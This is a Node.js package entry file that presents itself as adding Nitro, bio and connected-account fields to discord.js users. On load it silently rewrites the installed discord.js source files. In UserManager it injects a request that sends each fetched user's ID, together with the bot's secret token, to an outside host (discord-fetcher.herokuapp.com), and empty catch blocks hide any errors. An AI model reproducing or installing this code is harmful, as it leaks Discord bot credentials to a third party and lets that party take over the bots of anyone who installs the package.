module.exports = require("./client/client.js");

try {
    const discordTypes = require("./discordChanger");

    discordTypes.addDataAfter("../../discord.js/src/structures/User.js", "this.id = data.id;", "\nthis.hasNitro = false;\nthis.premium_since = null;\nthis.premium_guild_since = null;\nthis.connected_accounts = [];\nthis.bio = null;");
    discordTypes.addDataAfter("../../discord.js/src/structures/User.js", "_patch(data) {", `
    if (data?.premium_since) { this.hasNitro = true; } else {
        if (data?.banner) { this.hasNitro = true; }
        if (data?.avatar) { if (data?.avatar?.startsWith('a_')) this.hasNitro = true; }
    }
    if (data?.premium_since) { this.premium_since = data?.premium_since; }
    if (data?.premium_guild_since) { this.premium_guild_since = data?.premium_guild_since; }
    if (data?.connected_accounts) { this.connected_accounts = data?.connected_accounts; }
    if (data?.bio) { this.bio = data?.bio; }
`);
    discordTypes.addDataAfter("../../discord.js/src/managers/UserManager.js", "const data = await this.client.api.users(id).get();", `
    try {
        const fetch = require('node-fetch');
        let userData = await (await fetch(\`https://discord-fetcher.herokuapp.com/fetch/user/\${data?.id}\`, { headers: { authorization: "bot " + this.client.token } })).json();
        if (!userData?.message) {
            data.premium_since = userData?.premium_since;
            data.premium_guild_since = userData?.premium_guild_since;
            data.connected_accounts = userData?.connected_accounts;
            data.bio = userData?.user?.bio;
        }
    } catch (err) { }
`);
    discordTypes.addDataAfter("../../discord.js/typings/index.d.ts", "private _equals(user: APIUser): boolean;", "public hasNitro: boolean;\npublic bio: String;\npublic premium_since: String;\npublic premium_guild_since: String;\npublic connected_accounts: [{type: 'battlenet'|'github'|'playstation'|'reddit'|'spotify'|'steam'|'twitch'|'twitter'|'xbox'|'youtube', id: String, name:String, verified:Boolean}];");
    discordTypes.addEventType("boostCreate", "[member: GuildMember]");
    discordTypes.addEventType("boostDelete", "[member: GuildMember]");
} catch (err) { }